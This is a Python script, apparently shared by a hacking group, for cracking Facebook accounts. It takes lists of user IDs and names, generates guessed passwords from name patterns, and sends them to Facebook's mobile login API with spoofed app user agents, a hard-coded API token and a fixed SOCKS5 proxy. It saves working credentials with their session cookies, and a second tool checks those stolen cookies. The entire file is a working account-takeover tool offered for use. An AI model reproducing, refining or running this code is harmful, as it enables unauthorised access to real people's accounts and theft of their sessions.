#==== SC SEND BY : KALYAN KING 


#==== DC SCRIiPT

#==== FREE GIVE : KGF CYBER TEAM / KALYAN KING 

import os
import zlib
import sys
import time
import uuid
import random
import json
import requests
import threading
from os import system as cmd
from concurrent.futures import ThreadPoolExecutor as RASHIDbou
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

os.system('clear')

print('\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] GIFTED BY RANA ')

try:
    import requests
except ImportError:
    print('\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING REQUESTS ')
    os.system('pip install requests')

try:
    import concurrent.futures as concurrent
except ImportError:
    print('\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING FUTURES ')
    os.system('pip install futures')

totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total = []
methods = []
srange = 0
saved = []
filter = []
cok = []
plist = []
stop_ip_update = threading.Event()

AUTO_PASSWORDS = ['first123', 'first1234', 'first12345', 'first123456', 'firstlast123', 'firstlast1234', 'firstlast12345', 'firstlast123456', 'firstlast', 'first', 'first last', 'first@123', 'first@786', 'first@@@@', 'firstlast@123']

sys.stdout.write('\x1b]2; RASHID v3.1\x07')

PROXY_TYPE = 'socks5'
PROXY_ADDR = '149.40.194.206:1080'

def get_proxies():
    if PROXY_TYPE == 'none':
        return {}
    elif PROXY_ADDR:
        if PROXY_TYPE == 'http':
            p = f'http://{PROXY_ADDR}'
            return {'http': p, 'https': p}
        elif PROXY_TYPE == 'socks5':
            p = f'socks5h://{PROXY_ADDR}'
            return {'http': p, 'https': p}
    return {}

def create_session():
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.3, status_forcelist=(500, 502, 503, 504))
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.proxies.update(get_proxies())
    return session

A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']

def get_random_logo():
    c1 = random.choice(COLORS)
    c2 = random.choice(COLORS)
    c3 = random.choice(COLORS)
    c4 = random.choice(COLORS)
    c5 = random.choice(COLORS)
    c6 = random.choice(COLORS)
    return f'\n    \n{c1}  ██████╗░░█████╗░░██████╗██╗░░██╗██╗██████╗░\n{c2}  ██╔══██╗██╔══██╗██╔════╝██║░░██║██║██╔══██╗\n{c3}  ██████╔╝███████║╚█████╗░███████║██║██║░░██║\n{c4}  ██╔══██╗██╔══██║░╚═══██╗██╔══██║██║██║░░██║\n{c5}  ██║░░██║██║░░██║██████╔╝██║░░██║██║██████╔╝\n{c6}  ╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═════╝░\n\x1b[1;33m ❤️RASHID❤️MDS❤️KGF_SCRIPT_DC_GIVE 😭❤️\n\x1b[1;36m================================================\n\x1b[1;97m [•] \x1b[1;92mRASHID RANA\n\x1b[1;97m [•] \x1b[1;93mMDS BALOCH\n\x1b[1;97m [•] \x1b[1;94mFREE VERSION\n\x1b[1;97m [•] \x1b[1;95mVersion 3.1\n\x1b[1;97m [•] \x1b[1;96mRANA +923062593977\n\x1b[1;97m [•] \x1b[1;91mSC SEND : KALYAN KING / KGF CYBER TEAM \n\x1b[1;91m [!] \x1b[1;93mmkandar ka skndar🤪\n\x1b[91;1m ================================================\n{A}──────────────────────────────────────────────────'

def get_ip_info():
    try:
        r = requests.get('http://ip-api.com/json/', timeout=5)
        if r.status_code == 200:
            data = r.json()
            ip = data.get('query', 'Unknown')
            country = data.get('country', 'Unknown')
            country_code = data.get('countryCode', 'XX')
            flags = {
                'PK': '🇵🇰', 'IN': '🇮🇳', 'BD': '🇧🇩', 'US': '🇺🇸', 'GB': '🇬🇧',
                'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹',
                'ES': '🇪🇸', 'BR': '🇧🇷', 'MX': '🇲🇽', 'AR': '🇦🇷', 'CL': '🇨🇱',
                'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'CN': '🇨🇳', 'JP': '🇯🇵',
                'KR': '🇰🇷', 'TH': '🇹🇭', 'VN': '🇻🇳', 'ID': '🇮🇩', 'MY': '🇲🇾',
                'PH': '🇵🇭', 'SG': '🇸🇬', 'RU': '🇷🇺', 'UA': '🇺🇦', 'PL': '🇵🇱',
                'TR': '🇹🇷', 'SA': '🇸🇦', 'AE': '🇦🇪', 'EG': '🇪🇬', 'ZA': '🇿🇦',
                'NG': '🇳🇬', 'KE': '🇰🇪', 'AF': '🇦🇫', 'IR': '🇮🇷', 'IQ': '🇮🇶'
            }
            flag = flags.get(country_code, '🌍')
            return f'{ip} {flag} {country}'
    except:
        return 'Checking... 🔄'

def clear():
    os.system('clear')
    os.system("xdg-open https://t.me/+ZMekRdGZv-1iYWY1")
    ip = get_ip_info()
    print(f'\x1b[1;92m[\x1b[1;97mYOUR IP\x1b[1;92m] \x1b[1;93m{ip}')
    print(get_random_logo())

def update_ip_display():
    ip = get_ip_info()
    sys.stdout.write(f'\x1b[s\x1b[1;1H\x1b[1;92m[\x1b[1;97mYOUR IP\x1b[1;92m] \x1b[1;93m{ip}\x1b[K\x1b[u')
    sys.stdout.flush()

def linex():
    print(f'{A}──────────────────────────────────────────────────')

def result(OKs, cps):
    if len(OKs) != 0 or len(cps) != 0:
        linex()
        print(f'{G1}[{A}={G1}] PROCESS COMPLETED ✅')
        print(f'{G1}[{A}={G2}] TOTAL OK {A}: {G2}{len(oks)} ✓')
        print(f'{G1}[{A}={G3}] TOTAL CP {A}: {G3}{len(cps)} ⚠️')
        linex()
        input(f'{G1}[{A}={G4}] PRESS ENTER TO BACK ')
        menu()

def check_results():
    clear()
    print(f'{G1}[{A}={G1}] CHECKING RESULTS 📊')
    linex()
    ok_files = ['/sdcard/RASHID-OK/M1-OK-IDS.txt', '/sdcard/RASHID-OK/M2-OK-IDS.txt']
    cp_files = ['/sdcard/RASHID-CP/M1-CP-IDS.txt', '/sdcard/RASHID-CP/M2-CP-IDS.txt']
    total_ok = 0
    total_cp = 0
    for file in ok_files:
        with open(file, 'r') as f:
            count = len(f.readlines())
            total_ok += count
            if count > 0:
                print(f'{G2}[{A}✓{G2}] {file.split("/")[-1]}: {count}')
    for file in cp_files:
        with open(file, 'r') as f:
            count = len(f.readlines())
            total_cp += count
            if count > 0:
                print(f'{Y}[{A}⚠{Y}] {file.split("/")[-1]}: {count}')
    linex()
    print(f'{G1}[{A}={G1}] TOTAL OK: {total_ok} ✅')
    print(f'{Y}[{A}={Y}] TOTAL CP: {total_cp} ⚠️')
    linex()
    input(f'{G1}[{A}={G4}] Press ENTER to back...')
    menu()

def login_checker():
    clear()
    print(f'{G1}[{A}={G1}] LOGIN CHECKER - VERIFY OK IDS 🔓')
    linex()
    print(f'{G2}[{A}={G2}] EXAMPLE: /sdcard/RASHID-OK/M1-OK-IDS.txt')
    linex()
    file_path = input(f'{G1}[{A}?{G3}] FILE PATH: {G3}')
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
        if len(lines) == 0:
            print(f'{R}[{A}✗{R}] FILE IS EMPTY')
            time.sleep(2)
            menu()
            return
        clear()
        print(f'{G1}[{A}={G1}] FOUND {len(lines)} IDS')
        print(f'{G2}[{A}={G2}] STARTING LOGIN CHECK...')
        linex()
        working_ids = []
        dead_ids = []
        check_count = 0
        for line in lines:
            parts = line.strip().split('|')
            if len(parts) >= 3:
                uid = parts[0]
                password = parts[1]
                cookies = parts[2]
                if test_login(uid, password, cookies):
                    working_ids.append(line.strip())
                    print(f'{G1}[{A}✓{G1}] WORKING: {uid}')
                else:
                    dead_ids.append(line.strip())
                    print(f'{R}[{A}✗{R}] DEAD: {uid}')
                check_count += 1
                sys.stdout.write(f'\r{G1}[{A}CHECKED{G1}]{A} {check_count}/{len(lines)}')
                sys.stdout.flush()
        os.makedirs('/sdcard/RASHID-LOGIN-CHECK', exist_ok=True)
        if working_ids:
            with open('/sdcard/RASHID-LOGIN-CHECK/WORKING-IDS.txt', 'w') as f:
                f.write('\n'.join(working_ids))
        if dead_ids:
            with open('/sdcard/RASHID-LOGIN-CHECK/DEAD-IDS.txt', 'w') as f:
                f.write('\n'.join(dead_ids))
        print('\n')
        linex()
        print(f'{G1}[{A}={G1}] CHECK COMPLETED ✅')
        print(f'{G2}[{A}={G2}] WORKING: {len(working_ids)}')
        print(f'{R}[{A}={R}] DEAD: {len(dead_ids)}')
        print(f'{G3}[{A}={G3}] SAVED: /sdcard/RASHID-LOGIN-CHECK/')
        linex()
        input(f'{G1}[{A}={G4}] Press ENTER to back...')
        menu()
    except FileNotFoundError:
        print(f'{R}[{A}✗{R}] FILE NOT FOUND')
        time.sleep(2)
        menu()
    except Exception as e:
        print(f'{R}[{A}✗{R}] ERROR: {str(e)}')
        time.sleep(2)
        menu()

def test_login(uid, password, cookies):
    try:
        session = create_session()
        cookie_dict = {}
        for cookie in cookies.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookie_dict[name] = value
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
            'Cookie': cookies
        }
        response = session.get(f'https://graph.facebook.com/me?access_token={cookie_dict.get("c_user", "")}', headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'id' in data:
                return True
        response2 = session.get('https://m.facebook.com/profile.php', headers=headers, timeout=10)
        if response2.status_code == 200 and 'login' not in response2.url.lower():
            return True
        return False
    except:
        return False

def menu():
    try:
        os.system('xdg-open https://t.me/+ZMekRdGZv-1iYWY1')
    except:
        pass
    clear()
    print(f'{G1}[{A}1{G1}] FILE CLONING 📂')
    print(f'{G1}[{A}2{G2}] CHECK RESULTS 📊')
    print(f'{G1}[{A}3{G3}] LOGIN CHECKER (OK IDS) 🔓')
    print(f'{G1}[{A}0{G4}] EXIT TOOLS ❌')
    linex()
    select = input(f'{G1}[{A}?{G5}] CHOICE {A}: {G5}')
    if select == '1':
        _file_()
    elif select == '2':
        check_results()
    elif select == '3':
        login_checker()
    elif select == '0':
        print(f'{G1}[{A}={G1}] EXIT DONE ')
        exit()
    else:
        print(f'{G1}[{A}={G2}] INVALID OPTION')
        time.sleep(2)
        menu()

def _file_():
    clear()
    print(f'{G1}[{A}1{G1}] METHOD {G1}[{A}M1{G1}] - GRAPH API 🚀')
    print(f'{G1}[{A}2{G2}] METHOD {G2}[{A}M2{G2}] - ALTERNATE API ⚡')
    linex()
    option = input(f'{G1}[{A}?{G3}] CHOICE {A}: {G3}')
    methods.clear()
    if option == '1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option == '2':
        methods.append('methodB')
        main_crack().crack(id)
    else:
        print(f'{G1}[{A}={G2}] INVALID OPTION')
        time.sleep(2)
        _file_()

class main_crack:
    def __init__(self):
        self.id = []
    
    def crack(self, id):
        clear()
        print(f'{G1}[{A}={G1}] EXAMPLE {A}: {G1}/sdcard/RASHID.txt')
        linex()
        self.file = input(f'{G1}[{A}?{G2}] FILE NAME {A}: {G2}')
        try:
            with open(self.file, 'r') as f:
                lines = f.readlines()
            for line in lines:
                line = line.strip()
                if '|' in line:
                    parts = line.split('|')
                    if len(parts) >= 2:
                        self.id.append(line)
            if len(self.id) == 0:
                print(f'{R}[{A}✗{R}] NO VALID IDS FOUND')
                print(f'{Y}[{A}!{Y}] FORMAT: uid|name')
                time.sleep(3)
                main_crack().crack(id)
                return
            print(f'{G1}[{A}✓{G1}] LOADED {len(self.id)} IDS')
            time.sleep(1)
            self.pasw()
        except FileNotFoundError:
            print(f'{R}[{A}✗{R}] FILE NOT FOUND')
            time.sleep(2)
            print(f'{Y}[{A}!{Y}] TRY AGAIN')
            time.sleep(2)
            main_crack().crack(id)
        except Exception as e:
            print(f'{R}[{A}✗{R}] ERROR: {str(e)}')
            time.sleep(2)
            main_crack().crack(id)
    
    def methodA(self, sid, name, psw):
        devices = [
            '[FBAN/FB4A;FBAV/400.0.0.25.89;FBBV/482956062;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBRV/482956062;FBCR/Zong;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 11;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]',
            '[FBAN/FB4A;FBAV/401.0.0.28.90;FBBV/485623145;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBRV/485623145;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G97x;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
            '[FBAN/FB4A;FBAV/399.0.0.24.93;FBBV/478945632;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/478945632;FBCR/Telenor;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2239;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
        ]
        ua = random.choice(devices)
        loop += 1
        sys.stdout.write(f'\r{G1}[RASHID-M1]{A} [{loop}] [OK:{len(oks)}|CP:{len(cps)}]')
        sys.stdout.flush()
        fs = name.split(' ')[0]
        ls = name.split(' ')[1] if len(name.split(' ')) > 1 else fs
        for pw in psw:
            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls)
            try:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': sid,
                    'password': ps,
                    'credentials_type': 'device_based_login_password',
                    'generate_session_cookies': '1',
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-HTTP-Engine': 'Liger'
                }
                response = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, timeout=20, allow_redirects=False)
                q = response.json()
                if 'session_key' in q:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in q['session_cookies'])
                    print(f'\r\r{G1}[RASHID-OK] {sid} | {ps} ✅')
                    os.makedirs('/sdcard/RASHID-OK', exist_ok=True)
                    with open('/sdcard/RASHID-OK/M1-OK-IDS.txt', 'a') as f:
                        f.write(f'{sid}|{ps}|{ckkk}\n')
                    oks.append(sid)
                    return
                elif 'www.facebook.com' in str(q.get('error', {}).get('message', '')):
                    print(f'\r\r{M}[RASHID-CP] {sid} | {ps} ⚠️')
                    os.makedirs('/sdcard/RASHID-CP', exist_ok=True)
                    with open('/sdcard/RASHID-CP/M1-CP-IDS.txt', 'a') as f:
                        f.write(f'{sid}|{ps}\n')
                    cps.append(sid)
                    return
            except:
                pass
    
    def methodB(self, sid, name, psw):
        devices = [
            '[FBAN/FB4A;FBAV/398.0.0.21.104;FBBV/476523891;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_PK;FBRV/476523891;FBCR/Zong;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]',
            '[FBAN/FB4A;FBAV/402.0.0.29.95;FBBV/487956123;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_PK;FBRV/487956123;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G97x;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]',
            '[FBAN/FB4A;FBAV/397.0.0.20.88;FBBV/473214569;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_PK;FBRV/473214569;FBCR/Telenor;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2219;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
        ]
        ua = random.choice(devices)
        loop += 1
        sys.stdout.write(f'\r{G1}[RASHID-M2]{A} [{loop}] [OK:{len(oks)}|CP:{len(cps)}]')
        sys.stdout.flush()
        fs = name.split(' ')[0]
        ls = name.split(' ')[1] if len(name.split(' ')) > 1 else fs
        for pw in psw:
            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls)
            try:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': sid,
                    'password': ps,
                    'credentials_type': 'device_based_login_password',
                    'generate_session_cookies': '1',
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': '882a8490361da98702bf97a021ddc14d'
                }
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-HTTP-Engine': 'Liger'
                }
                response = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, timeout=20, allow_redirects=False)
                q = response.json()
                if 'session_key' in q:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in q['session_cookies'])
                    print(f'\r\r{G1}[RASHID-OK] {sid} | {ps} ✅')
                    os.makedirs('/sdcard/RASHID-OK', exist_ok=True)
                    with open('/sdcard/RASHID-OK/M2-OK-IDS.txt', 'a') as f:
                        f.write(f'{sid}|{ps}|{ckkk}\n')
                    oks.append(sid)
                    return
                elif 'www.facebook.com' in str(q.get('error', {}).get('message', '')):
                    print(f'\r\r{M}[RASHID-CP] {sid} | {ps} ⚠️')
                    os.makedirs('/sdcard/RASHID-CP', exist_ok=True)
                    with open('/sdcard/RASHID-CP/M2-CP-IDS.txt', 'a') as f:
                        f.write(f'{sid}|{ps}\n')
                    cps.append(sid)
                    return
            except:
                pass
    
    def pasw(self):
        pw = []
        clear()
        print(f'{G1}[{A}1{G1}] AUTO PASSWORD (15 PASSWORDS) 🤖')
        print(f'{G1}[{A}2{G2}] CUSTOM PASSWORD ✏️')
        linex()
        pw_choice = input(f'{G1}[{A}?{G3}] CHOICE {A}: {G3}')
        if pw_choice == '1':
            pw = AUTO_PASSWORDS.copy()
            clear()
        elif pw_choice == '2':
            clear()
            print(f'{G1}[{A}={G2}] EXAMPLE {A}: {G2}first123/firstlast/first@@@')
            linex()
            try:
                sl = int(input(f'{G1}[{A}?{G3}] PASSWORD LIMIT (1-20) {A}: {G3}'))
                if sl < 1 or sl > 20:
                    print(f'{G1}[{A}={G1}] LIMIT MUST BE 1-20')
                    time.sleep(2)
                    self.pasw()
                    return
                clear()
                print(f'{G1}[{A}?{G4}] EXAMPLE {A}: {G4}first123/firstlast/first@@@')
                linex()
                for sr in range(sl):
                    pw.append(input(f'{G1}[{A}={G1}] PASSWORD [{A}{sr+1}{G1}] {A}: {G1}'))
                clear()
            except:
                print(f'{G1}[{A}={G5}] INVALID INPUT')
                self.pasw()
                return
        else:
            print(f'{G1}[{A}={G2}] INVALID OPTION')
            time.sleep(2)
            self.pasw()
            return
        print(f'{G1}[{A}={G1}] TOTAL UIDs {A}: {G1}{len(self.id)} 📊')
        print(f'{G1}[{A}={G2}] PASSWORD LIMIT {A}: {G1}{len(pw)} 🔑')
        print(f'{G1}[{A}={G3}] STARTING CRACK... 🚀')
        print(f'{G1}[{A}={G4}] Please wait, processing...')
        linex()
        with RASHIDbou(max_workers=15) as executor:
            for zsb in self.id:
                parts = zsb.strip().split('|')
                if len(parts) >= 2:
                    uid = parts[0].strip()
                    name = parts[1].strip()
                    if 'methodA' in methods:
                        executor.submit(self.methodA, uid, name, pw)
                    elif 'methodB' in methods:
                        executor.submit(self.methodB, uid, name, pw)
                    time.sleep(0.01)
        result(oks, cps)

if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        print(f'\n{R}[{A}✗{R}] INTERRUPTED BY USER')
        exit()
    except Exception as e:
        print(f'\n{R}[{A}✗{R}] ERROR: {str(e)}')
        exit()